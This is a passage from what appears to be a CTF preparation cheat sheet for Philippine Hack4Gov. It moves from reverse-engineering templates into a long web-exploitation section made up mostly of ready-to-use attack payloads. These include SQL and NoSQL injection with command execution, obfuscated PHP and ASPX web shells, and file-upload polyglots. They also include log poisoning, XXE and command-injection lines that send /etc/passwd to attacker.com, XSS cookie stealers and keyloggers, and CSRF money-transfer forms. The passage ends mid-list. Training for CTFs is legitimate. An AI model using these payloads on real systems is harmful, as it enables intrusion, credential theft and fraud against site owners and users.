    - File operations (check what files are read/written)
    - Network communications
    - Memory at specific addresses
3. **Timing/Side-channel attacks**:
    
    - Password check byte-by-byte
    - Timing differences in comparison
    - Resource usage patterns

### Automation & Scripting

#### Angr Template

```python
import angr
import claripy

proj = angr.Project('./binary')
flag_length = 20
flag = claripy.BVS('flag', flag_length * 8)

state = proj.factory.entry_state(stdin=flag)
for byte in flag.chop(8):
    state.solver.add(byte >= 0x20)
    state.solver.add(byte <= 0x7e)

simgr = proj.factory.simulation_manager(state)
simgr.explore(find=0xGOOD_ADDR, avoid=0xBAD_ADDR)

if simgr.found:
    print(simgr.found[0].posix.dumps(0))
```

#### Z3 Solver Template

```python
from z3 import *

flag = [BitVec(f'flag_{i}', 8) for i in range(20)]
s = Solver()

# Add constraints
for f in flag:
    s.add(f >= 0x20, f <= 0x7e)

# Add challenge-specific constraints
# s.add(flag[0] ^ flag[1] == 0x42)

if s.check() == sat:
    m = s.model()
    print(''.join(chr(m[f].as_long()) for f in flag))
```

---

## 📚 Online Resources & Decompilers

### Web-Based Decompilers

- **Decompiler.com**: Multiple languages support
- **RetDec Online**: retdec.com
- **Compiler Explorer**: godbolt.org (understand compiler output)
- **OnlineGDB**: Online debugging for multiple languages

### CTF-Specific Resources

- **GTFOBins**: Living off the land binaries
- **CyberChef**: Data transformation toolkit
- **factordb.com**: Large number factorization
- **dCode.fr**: Classical cipher tools

### Philippine Hack4Gov Specific

- Be aware of local flag formats (might use Filipino words/references)
- Common themes: government, cybersecurity awareness, local culture
- Check for steganography in images with Filipino landmarks
- Consider timezone-based challenges (PHT/GMT+8)

---

## 🎓 Learning Path Recommendations

### Beginner

1. Start with Python/Java reversing (higher level)
2. Learn basic assembly (x86/x64)
3. Practice with crackmes.one
4. Solve easy RE challenges on PicoCTF

### Intermediate

1. Master GDB/x64dbg
2. Learn about packers and protectors
3. Understand crypto implementations
4. Practice on HackTheBox RE challenges

### Advanced

1. Symbolic execution (angr, manticore)
2. Emulation frameworks (Unicorn, QEMU)
3. Vulnerability research techniques
4. Custom tool development

---

## 🏁 Final CTF Strategy

1. **Triage** (2 minutes):
    
    - File type identification
    - Strings check
    - Basic execution test
2. **Quick attempts** (10 minutes):
    
    - Common passwords/inputs
    - Environment manipulation
    - Basic patching
3. **Deep dive** (if needed):
    
    - Full static analysis
    - Debugging session
    - Scripting/automation

Remember: In CTF, the goal is the flag, not perfect understanding. Be pragmatic, use shortcuts, and move on if stuck too long. Good luck with PH Hack4Gov!

---

_"The best reverse engineer is a lazy reverse engineer - automate everything you can!"_

---

# Web Exploitation

## Table of Contents

1. [Initial Reconnaissance](#initial-reconnaissance)
2. [Web Enumeration](#web-enumeration)
3. [Authentication Attacks](#authentication-attacks)
4. [SQL Injection](#sql-injection)
5. [NoSQL Injection](#nosql-injection)
6. [File Upload Attacks](#file-upload-attacks)
7. [File Inclusion Vulnerabilities](#file-inclusion-vulnerabilities)
8. [XML Attacks](#xml-attacks)
9. [Command Injection](#command-injection)
10. [Cross-Site Scripting (XSS)](#cross-site-scripting)
11. [Cross-Site Request Forgery (CSRF)](#csrf)
12. [Server-Side Request Forgery (SSRF)](#ssrf)
13. [Insecure Deserialization](#insecure-deserialization)
14. [JWT Attacks](#jwt-attacks)
15. [API Testing](#api-testing)
16. [CMS Exploitation](#cms-exploitation)
17. [WAF Bypass Techniques](#waf-bypass)
18. [Specialized Attacks](#specialized-attacks)
19. [Post-Exploitation](#post-exploitation)
20. [CTF-Specific Tips](#ctf-specific-tips)

---

## Initial Reconnaissance

### Port Scanning & Service Detection

```bash
# Comprehensive nmap scan
nmap -sV -sC -O -A -p- --min-rate=1000 <IP> -oA full_scan

# Fast port discovery
masscan -p1-65535,U:1-65535 <IP> --rate=1000 -e tun0

# Service version detection
nmap -sV --version-intensity 9 -p <ports> <IP>

# HTTP/HTTPS specific enumeration
nmap --script "http-* and not intrusive" -p80,443,8080,8443 <IP>

# Vulnerability scanning
nmap --script vuln -p <ports> <IP>
```

### DNS Enumeration

```bash
# DNS records enumeration
dnsrecon -d domain.com -t std

# Zone transfer attempt
dig axfr @<DNS_IP> domain.com
host -l domain.com <DNS_IP>
dnsrecon -d domain.com -t axfr

# Subdomain enumeration
sublist3r -d domain.com
amass enum -d domain.com
ffuf -u https://FUZZ.domain.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# DNS cache snooping
dnsrecon -t snoop -D /usr/share/wordlists/namelist.txt -n <DNS_IP>

# Reverse DNS lookup
dnsrecon -r <IP_range> -n <DNS_IP>
```

### Virtual Host Discovery

```bash
# Gobuster vhost mode
gobuster vhost -u http://<IP> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# FFuF vhost discovery
ffuf -w /usr/share/wordlists/subdomains.txt -H "Host: FUZZ.domain.com" -u http://<IP> -fs <filter_size>

# wfuzz vhost enumeration
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.domain.com" --hw <word_count> http://<IP>
```

---

## Web Enumeration

### Advanced Directory & File Discovery

#### Recursive Directory Enumeration

```bash
# Feroxbuster with advanced options
feroxbuster -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
  -x php,asp,aspx,jsp,html,js,txt,zip,bak,old,inc,src \
  --depth 3 --threads 100 --timeout 10 --burp

# Dirsearch with recursive mode
python3 dirsearch.py -u http://<IP> -e php,asp,aspx,jsp,html,js -r -R 3

# Gobuster with patterns
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt \
  -p patterns.txt -x php,txt,html -t 50
```

#### Pattern File for Gobuster (patterns.txt)

```
{GOBUSTER}/backup
{GOBUSTER}.bak
{GOBUSTER}.old
{GOBUSTER}~
.{GOBUSTER}.swp
{GOBUSTER}.save
{GOBUSTER}.orig
{GOBUSTER}.original
{GOBUSTER}.copy
```

### Technology Stack Fingerprinting

```bash
# Whatweb detailed scan
whatweb -v -a 3 http://<IP>

# Wappalyzer CLI
wappalyzer http://<IP>

# Retire.js for JavaScript libraries
retire --path <website_directory>

# BlindElephant CMS detection
python BlindElephant.py http://<IP>
```

### Parameter Discovery

```bash
# Arjun - Parameter discovery
arjun -u http://<IP>/index.php

# FFuF parameter fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u http://<IP>/index.php?FUZZ=value -mc 200,301,302,401,403

# ParamSpider
python3 paramspider.py --domain <domain> --output params.txt

# x8 - Hidden parameter discovery
x8 -u http://<IP>/page -w /usr/share/wordlists/params.txt
```

### JavaScript Analysis

```bash
# LinkFinder - Extract endpoints from JS
python3 linkfinder.py -i http://<IP> -o cli

# JSParser
python3 jsparser.py -u http://<IP>/script.js

# Nuclei JavaScript analysis
nuclei -u http://<IP> -t exposures/tokens/

# Extract JS files and analyze
wget -r -l 2 -A js http://<IP>
grep -r "api\|token\|key\|secret\|password" *.js
```

### Content Discovery Techniques

```bash
# Backup files discovery
for ext in bak old backup orig original src save copy tmp temp swp ~ _bak _old; do
  ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<IP>/FUZZ.$ext -mc 200
done

# Version control discovery
for vc in .git .svn .hg .bzr; do
  curl -s http://<IP>/$vc/HEAD && echo "Found $vc"
done

# Configuration files
ffuf -w config_files.txt -u http://<IP>/FUZZ -mc 200,403

# Database files
ffuf -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt \
  -u http://<IP>/FUZZ -e .db,.sqlite,.sqlite3,.mdb -mc 200
```

### Git Repository Exploitation

```bash
# GitTools - Dumper
./gitdumper.sh http://<IP>/.git/ output_dir

# GitTools - Extractor
./extractor.sh output_dir extracted_dir

# git-dumper (alternative)
git-dumper http://<IP>/.git/ output_dir

# Analyze git logs
git log --oneline
git diff HEAD~1
git show <commit_hash>

# Search for secrets
truffleHog file://extracted_dir
gitleaks detect -v
```

---

## Authentication Attacks

### Brute Force Attacks

#### Hydra Examples

```bash
# HTTP POST Form
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=incorrect"

# HTTP Basic Auth
hydra -l admin -P passwords.txt <IP> http-get /admin/

# With cookies
hydra -l admin -P passwords.txt <IP> http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=Failed:H=Cookie: PHPSESSID=abcdef"
```

#### FFuF Authentication

```bash
# Login form brute force
ffuf -w users.txt:USER -w passwords.txt:PASS -X POST \
  -d "username=USER&password=PASS" -H "Content-Type: application/x-www-form-urlencoded" \
  -u http://<IP>/login -fc 401,403

# Basic auth
ffuf -w users.txt:USER -w passwords.txt:PASS \
  -u http://USER:PASS@<IP>/admin -fc 401
```

### Password Reset Vulnerabilities

```python
# Testing password reset tokens
import hashlib
import time

# Predictable token generation
for i in range(1000):
    timestamp = int(time.time()) - i
    token = hashlib.md5(str(timestamp).encode()).hexdigest()
    print(f"Testing token: {token}")
```

### Session Attacks

#### Session Fixation

```http
# Force known session ID
GET /login.php?PHPSESSID=controlled_session_id
Cookie: PHPSESSID=controlled_session_id
```

#### Session Prediction

```python
# Analyze session patterns
sessions = ['abc123', 'abc124', 'abc125']
# Look for incremental patterns, timestamps, weak randomness
```

### OAuth Vulnerabilities

```
# Common OAuth misconfigurations
- Redirect URI validation bypass: redirect_uri=http://evil.com@legitimate.com
- State parameter missing/not validated
- Token leakage in referrer
- Authorization code reuse
```

### Multi-Factor Authentication Bypass

```
# 2FA Bypass techniques
- Response manipulation (change false to true)
- Status code manipulation (change 403 to 200)
- 2FA code brute force
- Backup codes exploitation
- Direct navigation after first factor
- Password reset doesn't require 2FA
```

---

## SQL Injection

### Advanced Manual Exploitation

#### Union-Based SQL Injection

```sql
-- Determine number of columns (Order By)
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- - (Continue until error)

-- Determine number of columns (Union Select)
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -

-- Find database version
' UNION SELECT @@version,NULL,NULL-- -              # MySQL/MSSQL
' UNION SELECT version(),NULL,NULL-- -              # PostgreSQL
' UNION SELECT banner,NULL,NULL FROM v$version-- -  # Oracle

-- Database enumeration
' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata-- -
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='database'-- -
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -

-- Data extraction with concatenation
' UNION SELECT CONCAT(username,':',password),NULL,NULL FROM users-- -
' UNION SELECT CONCAT_WS(':', username, password, email) FROM users-- -
```

#### Error-Based SQL Injection

```sql
-- MySQL error-based
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -

-- MSSQL error-based
' AND 1=CONVERT(INT,(SELECT @@version))-- -

-- PostgreSQL error-based
' AND 1=CAST((SELECT version()) AS INT)-- -

-- Oracle error-based
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version))-- -
```

#### Blind SQL Injection

```sql
-- Boolean-based blind
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'-- -
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>65-- -

-- Time-based blind (MySQL)
' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97,SLEEP(5),0)-- -

-- Time-based blind (PostgreSQL)
' AND (CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97) THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -
```

#### Second-Order SQL Injection

```sql
-- Registration phase
Username: admin'-- -
Password: password

-- Later query becomes
SELECT * FROM users WHERE username='admin'-- -' AND password='...'
```

### SQLMap Advanced Techniques

```bash
# Custom injection point with asterisk
sqlmap -u "http://<IP>/page.php?id=1*" --technique=U

# JSON POST data
sqlmap -u http://<IP>/api --data='{"id":1}' --method=POST --headers="Content-Type: application/json"

# Custom SQL injection
sqlmap -u http://<IP>/page.php?id=1 --suffix="-- -" --prefix="' AND "

# Bypassing WAF
sqlmap -u http://<IP>/page.php?id=1 --random-agent --tamper=space2comment,charencode

# Direct database connection
sqlmap -d "mysql://user:pass@<IP>:3306/database"

# File read/write
sqlmap -u http://<IP>/page.php?id=1 --file-read=/etc/passwd
sqlmap -u http://<IP>/page.php?id=1 --file-write=shell.php --file-dest=/var/www/html/shell.php
```

### Database-Specific Techniques

#### MySQL

```sql
-- Read files
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL-- -

-- Write files
' UNION SELECT '<?php system($_GET["cmd"]); ?>',NULL,NULL INTO OUTFILE '/var/www/html/shell.php'-- -

-- Command execution (if available)
' UNION SELECT sys_exec('whoami'),NULL,NULL-- -
```

#### MSSQL

```sql
-- Enable xp_cmdshell
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;-- -

-- Command execution
'; EXEC xp_cmdshell 'whoami';-- -

-- NTLM hash stealing
'; EXEC xp_dirtree '\\attacker_ip\share';-- -
```

#### PostgreSQL

```sql
-- Command execution
'; CREATE TABLE cmd_exec(cmd_output text);-- -
'; COPY cmd_exec FROM PROGRAM 'whoami';-- -
'; SELECT * FROM cmd_exec;-- -

-- Read files
' UNION SELECT pg_read_file('/etc/passwd'),NULL,NULL-- -
```

---

## NoSQL Injection

### MongoDB Injection

```javascript
// Authentication bypass
username[$ne]=admin&password[$ne]=admin
username=admin&password[$regex]=^.*
username=admin&password[$gt]=

// JavaScript injection
username=admin&password=1'; return true; var dummy='
username=admin&password=1' || '1'=='1

// Extract data with regex
username[$regex]=^a.*&password[$ne]=1  // Check if username starts with 'a'
username[$regex]=^admin$&password[$regex]=^.{5}$  // Check password length

// Blind extraction script
import requests
import string

password = ""
url = "http://target.com/login"
while True:
    for c in string.ascii_letters + string.digits:
        payload = {"username": "admin", "password": {"$regex": f"^{password}{c}.*"}}
        r = requests.post(url, json=payload)
        if "success" in r.text:
            password += c
            print(f"Password: {password}")
            break
```

### CouchDB Injection

```javascript
// Authentication bypass
username=admin&password={"$gt":""}

// Query manipulation
?startkey="admin"&endkey="admin\ufff0"
```

### Redis Injection

```bash
# Command injection through Redis
auth password
config set dir /var/www/html
config set dbfilename shell.php
set test "<?php system($_GET['cmd']); ?>"
save
```

---

## File Upload Attacks

### Advanced Bypass Techniques

#### Double Extension

```
shell.php.jpg
shell.php.png
shell.jsp.jpg
shell.php;.jpg
shell.php%00.jpg
```

#### MIME Type Manipulation

```python
import requests

files = {
    'upload': ('shell.php', open('shell.php', 'rb'), 'image/jpeg')
}
headers = {'Content-Type': 'multipart/form-data'}
requests.post('http://target/upload', files=files)
```

#### Polyglot Files

```bash
# GIF/PHP polyglot
echo 'GIF89a;<?php system($_GET["cmd"]); ?>' > shell.gif

# JPEG/PHP polyglot
printf "\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00\xff\xdb\x00\x43\x00<?php system(\$_GET['cmd']); ?>" > shell.jpg

# PDF/PHP polyglot
echo '%PDF-1.4<?php system($_GET["cmd"]); ?>' > shell.pdf

# ZIP/PHP polyglot
echo -e "PK\x03\x04<?php system(\$_GET['cmd']); ?>" > shell.zip
```

#### Content-Type Bypass Collection

```
Content-Type: image/jpeg
Content-Type: image/gif
Content-Type: image/png
Content-Type: application/pdf
Content-Type: application/octet-stream
```

#### Filename Tricks

```
shell.PHP
shell.pHp
shell.php5
shell.phtml
shell.phar
shell.inc
shell.php....
shell.php%20
shell.php%0a
shell.php%00
shell.php%0d%0a
shell.php/
shell.php.\
shell.
shell.php::$DATA
```

### Image Metadata Exploitation

```bash
# Exiftool payload injection
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg

# All metadata fields
exiftool -DocumentName='<?php system($_GET["cmd"]); ?>' \
        -Copyright='<?php system($_GET["cmd"]); ?>' \
        -Artist='<?php system($_GET["cmd"]); ?>' \
        -ImageDescription='<?php system($_GET["cmd"]); ?>' \
        image.jpg

# ImageMagick exploitation (CVE-2016-3714)
convert 'https://example.com"|curl http://attacker.com/shell.sh|bash"' out.png
```

### Advanced Web Shells

#### Obfuscated PHP Shells

```php
// Base64 encoded function names
<?php $a=base64_decode('c3lzdGVt');$a($_REQUEST['x']); ?>

// Variable functions
<?php $f='sys'.'tem';$f($_GET['c']); ?>

// Create_function
<?php $func = create_function('$cmd', 'system($cmd);'); $func($_GET['cmd']); ?>

// Assert
<?php assert($_REQUEST['cmd']); ?>

// Preg_replace with /e modifier
<?php preg_replace('/.*/e', $_REQUEST['cmd'], ''); ?>

// Include with data wrapper
<?php include('data://text/plain;base64,'.base64_encode('<?php system($_GET["cmd"]); ?>')); ?>
```

#### JSP Shells

```jsp
<%@ page import="java.io.*" %>
<%
                                                                                                                                                                                                                                                       
%>
```

#### ASP/ASPX Shells

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
string cmd = Request.QueryString["cmd"];
Process proc = new Process();
proc.StartInfo.FileName = "cmd.exe";
proc.StartInfo.Arguments = "/c " + cmd;
proc.StartInfo.UseShellExecute = false;
proc.StartInfo.RedirectStandardOutput = true;
proc.Start();
Response.Write(proc.StandardOutput.ReadToEnd());
%>
```

---

## File Inclusion Vulnerabilities

### Local File Inclusion (LFI)

#### Basic LFI Techniques

```
# Direct traversal
../../../etc/passwd
....//....//....//etc/passwd
..;/..;/..;/etc/passwd

# Encoding bypasses
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double encoding
..%25%32%66..%25%32%66..%25%32%66etc%25%32%66passwd

# UTF-8 encoding
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
```

#### PHP Wrapper Exploitation

```
# Base64 filter for source code reading
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=config.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php

# Compression wrappers
compress.zlib://file.txt
compress.bzip2://file.txt
zip://archive.zip#file.txt
phar://archive.phar/file.txt

# Data wrapper for code execution
data://text/plain,<?php system($_GET['cmd']); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

# Input wrapper (requires POST)
php://input
POST: <?php system('whoami'); ?>

# Expect wrapper (if enabled)
expect://id
expect://ls
```

#### LFI to RCE via Log Poisoning

```bash
# Apache/Nginx access log
1. Send request with PHP code in User-Agent:
   curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
2. Include log file:
   /var/log/apache2/access.log
   /var/log/nginx/access.log

# SSH log poisoning
1. SSH with PHP code as username:
   ssh '<?php system($_GET["cmd"]); ?>'@target.com
2. Include log:
   /var/log/auth.log
   /var/log/sshd.log

# Mail log poisoning
1. Send email with PHP code
2. Include log:
   /var/log/mail.log
   /var/mail/username
```

#### LFI to RCE via PHP Sessions

```
# Default session paths
/var/lib/php/sessions/sess_[PHPSESSID]
/var/lib/php5/sessions/sess_[PHPSESSID]
/tmp/sess_[PHPSESSID]
C:\Windows\Temp\sess_[PHPSESSID]

# Exploit:
1. Find PHPSESSID in cookies
2. Inject PHP code into session (via other input)
3. Include session file
```

#### Useful LFI Files

```
# Linux
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/crontab
/proc/self/environ
/proc/self/cmdline
/proc/self/exe
/proc/self/fd/[0-9]
/proc/version
/proc/net/tcp
/proc/net/udp
/home/user/.ssh/id_rsa
/home/user/.ssh/authorized_keys
/home/user/.bash_history
/root/.bash_history
/var/log/apache2/error.log
/usr/local/apache/logs/error_log

# Windows
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\config\SAM
C:\Windows\repair\SAM
C:\Windows\System32\config\SYSTEM
C:\inetpub\wwwroot\web.config
C:\xampp\apache\logs\access.log
```

### Remote File Inclusion (RFI)

#### RFI Exploitation

```
# Basic RFI
http://target.com/page.php?file=http://attacker.com/shell.txt

# With null byte
http://target.com/page.php?file=http://attacker.com/shell.txt%00

# SMB share (Windows)
http://target.com/page.php?file=\\attacker.com\share\shell.txt

# FTP
http://target.com/page.php?file=ftp://attacker.com/shell.txt

# Data URL
http://target.com/page.php?file=data://text/plain,<?php system($_GET['cmd']); ?>
```

---

## XML Attacks

### XXE (XML External Entity) Injection

#### File Disclosure

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>

<!-- PHP wrapper in XXE -->
<!DOCTYPE data [
  <!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<data>&file;</data>
```

#### SSRF via XXE

```xml
<!DOCTYPE data [
  <!ENTITY ssrf SYSTEM "http://internal-server:8080/admin">
]>
<data>&ssrf;</data>

<!-- Port scanning -->
<!DOCTYPE data [
  <!ENTITY port SYSTEM "http://localhost:22">
]>
<data>&port;</data>
```

#### Blind XXE (Out-of-Band)

```xml
<!-- External DTD -->
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<data>&send;</data>

<!-- evil.dtd content: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%send;
```

#### XXE in Different File Formats

**SVG Files**

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="10">&xxe;</text>
</svg>
```

**DOCX/XLSX (Office Documents)**

```xml
<!-- Extract, modify, and recompress -->
<!-- In document.xml or similar -->
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<document>&xxe;</document>
```

**SOAP**

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <!DOCTYPE data [
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <data>&xxe;</data>
  </soap:Body>
</soap:Envelope>
```

### XPath Injection

```
# Authentication bypass
username: admin' or '1'='1
password: ' or '1'='1

# Extract data
username: ' or name()='username' or '
username: '] | //user[userid='2
```

---

## Command Injection

### Detection & Basic Exploitation

```bash
# Command separators
; ls
| ls
|| ls
& ls
&& ls
%0a ls
%0d ls
$(ls)
`ls`
{ls,}

# Time-based detection
; sleep 10
| sleep 10
& ping -c 10 127.0.0.1
|| ping -n 10 127.0.0.1
```

### Bypass Techniques

#### Space Bypass

```bash
# IFS (Internal Field Separator)
cat$IFS/etc/passwd
cat${IFS}/etc/passwd

# Brace expansion
{cat,/etc/passwd}

# Tab and newline
cat	/etc/passwd  # Tab
cat</etc/passwd

# HTML encoding in web context
cat%20/etc/passwd
```

#### Command Obfuscation

```bash
# String concatenation
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd

# Variable expansion
a=c;b=at;$a$b /etc/passwd

# Wildcards
/bin/c?t /etc/passwd
/bin/c*t /etc/passwd
/???/c?t /etc/passwd

# Base64 encoding
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash

# Hex encoding
echo 636174202f6574632f706173737764 | xxd -r -p | bash
```

#### Filter Evasion

```bash
# If 'cat' is blacklisted
tac /etc/passwd | tac
more /etc/passwd
less /etc/passwd
head /etc/passwd
tail /etc/passwd
nl /etc/passwd
od -c /etc/passwd
awk '{print}' /etc/passwd
sed '' /etc/passwd

# If '/' is blacklisted
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo -n /etc/passwd)

# Using environment variables
$PATH=/etc:$PATH passwd
```

### Blind Command Injection

```bash
# DNS exfiltration
nslookup $(whoami).attacker.com

# Time-based
if [ $(whoami) = "root" ]; then sleep 5; fi

# HTTP exfiltration
curl http://attacker.com/$(whoami)
wget http://attacker.com/$(cat /etc/passwd | base64)
```

---

## Cross-Site Scripting (XSS)

### XSS Contexts & Payloads

#### HTML Context

```html
<!-- Basic -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

<!-- Event handlers -->
<div onclick=alert(1)>Click</div>
<input onfocus=alert(1) autofocus>
<select onchange=alert(1)><option>1<option>2</select>
<textarea onkeyup=alert(1)></textarea>

<!-- Less common tags -->
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<marquee onstart=alert(1)>
```

#### Attribute Context

```html
<!-- Breaking out of attributes -->
"><script>alert(1)</script>
" onclick=alert(1) x="
" onmouseover=alert(1) x="
"><img src=x onerror=alert(1)>

<!-- Without quotes -->
onclick=alert(1)//
onmouseover=alert(1)//
```

#### JavaScript Context

```javascript
// Breaking out of strings
'; alert(1); //
'; alert(1); var x='
\'; alert(1); //
</script><script>alert(1)</script>

// Template literals
${alert(1)}
`${alert(1)}`

// Unicode escapes
\u003cscript\u003ealert(1)\u003c/script\u003e
```

### Advanced XSS Techniques

#### Filter Bypass

```javascript
// Without parentheses
<img src=x onerror=alert`1`>
<img src=x onerror=alert.call`${1}`>
<img src=x onerror=alert.bind\x28null,1\x29\x28\x29>

// Without alert <img src=x onerror=prompt`1`> <img src=x onerror=confirm`1`> <img src=x onerror=eval('al'+'ert(1)')>

// Case variations

<ScRiPt>alert(1)</ScRiPt> <IMG SRC=X ONERROR=alert(1)>

// Encoding <img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;"> <img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)"> <img src=x onerror="\x61\x6c\x65\x72\x74(1)">

// Using constructors <img src=x onerror=constructor.constructor('alert(1)')()> <img src=x onerror=[].find.constructor('alert(1)')()>
````

#### DOM XSS
```javascript
// Sources (user input)
document.location
document.URL
document.referrer
window.name
document.cookie

// Sinks (dangerous functions)
eval()
setTimeout()
setInterval()
innerHTML
document.write()
element.src

// Example exploits
#<img src=x onerror=alert(1)>
?name=<script>alert(1)</script>
````

#### Polyglot XSS

```javascript
// Works in multiple contexts
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

#### XSS Payloads for Specific Goals

**Cookie Theft**

```javascript
<script>
fetch('http://attacker.com/steal?c='+document.cookie)
</script>

<img src=x onerror="this.src='http://attacker.com/steal?c='+document.cookie">
```

**Keylogger**

```javascript
<script>
document.onkeypress = function(e) {
  fetch('http://attacker.com/log?key=' + e.key);
}
</script>
```

**Phishing/Defacement**

```javascript
<script>
document.body.innerHTML = '<h1>Hacked!</h1>';
</script>

<script>
document.body.innerHTML = '<form action="http://attacker.com/phish" method="post">Username: <input name="user"><br>Password: <input type="password" name="pass"><br><input type="submit"></form>';
</script>
```

**Port Scanning**

```javascript
<script>
for(let port of [22,80,443,3306,8080]) {
  let img = new Image();
  img.src = `http://localhost:${port}`;
  img.onload = () => fetch(`http://attacker.com/open?port=${port}`);
}
</script>
```

### Content Security Policy (CSP) Bypass

```javascript
// Using whitelisted domains
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.min.js"></script>
<div ng-app ng-csp ng-click="$event.view.alert(1)">Click</div>

// JSONP endpoints
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>

// Using base tag
<base href="http://attacker.com/">
<script src="/safe.js"></script> <!-- Loads from attacker.com -->

// Data URI (if allowed)
<script src="data:,alert(1)"></script>
```

---

## Cross-Site Request Forgery (CSRF)

### CSRF Attack Vectors

#### HTML Forms

```html
<!-- Auto-submitting form -->
<form action="http://target.com/transfer" method="POST" id="csrf">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000000">
</form>
<script>document.getElementById('csrf').submit();</script>

<!-- Using iframe -->
<iframe style="display:none" name="csrf"></iframe>
<form action="http://target.com/delete" method="POST" target="csrf" id="csrf">
  <input type="hidden" name="id" value="1">
</form>
<script>document.getElementById('csrf').submit();</script>
```

#### AJAX Requests

```javascript
// XMLHttpRequest
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://target.com/api/transfer', true);
xhr.withCredentials = true;
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send(JSON.stringify({to: 'attacker', amount: 1000000}));

// Fetch API
fetch('http://target.com/api/transfer', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({to: 'attacker', amount: 1000000})
});
```

### CSRF Token Bypass

```javascript
// Token in GET parameter (sometimes works with POST)
<img src="http://target.com/transfer?to=attacker&amount=1000&csrf_token=VALUE">

// Predictable tokens
// Check for patterns: MD5(sessionid), timestamp-based, etc.

// Token disclosure
// Check if token appears in:
// - Referer header
// - GET parameters
// - Other pages accessible without token

// Method override
// Try changing POST to GET or vice versa

// Remove token parameter entirely
// Sometimes validation is missing
```

---

## Server-Side Request Forgery (SSRF)

### SSRF Detection & Exploitation

#### Common SSRF Parameters

```
url=
uri=
path=
dest=
redirect=
target=
callback=
return=
page=
feed=
host=
site=
img=
image=
source=
src=
```

#### SSRF Payloads

```
# Local services
http://127.0.0.1:80
http://localhost:80
http://127.1:80
http://0.0.0.0:80
http://[::1]:80
http://[::]80

# Cloud metadata
http://169.254.169.254/latest/meta-data/            # AWS
http://metadata.google.internal/                     # Google Cloud
http://169.254.169.254/metadata/v1/                 # Azure

# Internal network scanning
http://192.168.1.1:80
http://10.0.0.1:80
http://172.16.0.1:80

# Protocol smuggling
